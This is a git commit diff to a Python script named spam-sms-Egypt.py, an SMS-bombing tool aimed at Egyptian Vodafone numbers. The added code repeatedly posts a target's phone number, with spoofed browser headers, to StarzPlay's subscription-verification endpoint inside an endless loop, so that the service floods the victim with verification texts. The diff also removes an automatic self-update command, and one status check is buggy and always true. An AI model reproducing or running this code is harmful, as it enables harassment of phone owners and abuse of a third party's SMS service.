828fa0b83e5e6515dbb6b90eb719a49cbf34ddcc
Adel Fox <63554550+AdelFox1@users.noreply.github.com>
2022-06-03 00:50:03 +0200

    Add files via upload

--- spam-sms-Egypt.py
+++ spam-sms-Egypt.py
@@ -1,7 +1,5 @@
 import os,sys,time
 os.system("clear")
-os.system('git pull')
-os.system('clear')
 try:
 	import requests
 	import pyfiglet
@@ -78,12 +76,36 @@ def vodafone():
 	url3 =('https://adelfox-spam-sms-vodafone.herokuapp.com/?number='+number)
 	while True:
 		try:
-			req = s.get(url3).json()
-			re = req['result']
-			if 'Done send' in re:
-				print(G+'Done Send ✅')
-			elif 'Failed' in re:
-				print(R+'Failed ❌')
+			url = 'https://arabia.starzplay.com/api/esb/userAccount/MSISDN/verify'
+			hd = {
+    "Host": "arabia.starzplay.com",
+    "content-length": "86",
+    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"90\", \"Google Chrome\";v\u003d\"90\"",
+    "accept": "application/json, text/javascript, */*; q\u003d0.01",
+    "x-requested-with": "XMLHttpRequest",
+    "sec-ch-ua-mobile": "?1",
+    "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
+    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
+    "origin": "https://arabia.starzplay.com", "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-dest": "empty",
+    "referer": "https://arabia.starzplay.com/ar/partners/vodafone-egypt",
+    "accept-encoding": "gzip, deflate, br",
+    "accept-language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
+    "cookie": "_gat_UA-52364929-4\u003d1"
+}
+			data = {
+    'mobilePrefix': '20',
+    'mobileNumber': number,
+    'operator': 'vodafoneegypt',
+    'subscriptionPeriod': 'WEEK'
+}
+
+			req =s.post(url,headers=hd,data=data)
+			if 'smsTransactionId' in req.text:
+				print(G+'Done send ✅')
+			elif 'errorCode' or '400' in req.text:
+				print(R+'Failled ❌')
 			else:
 				print(R+'Error')
 		except:pass
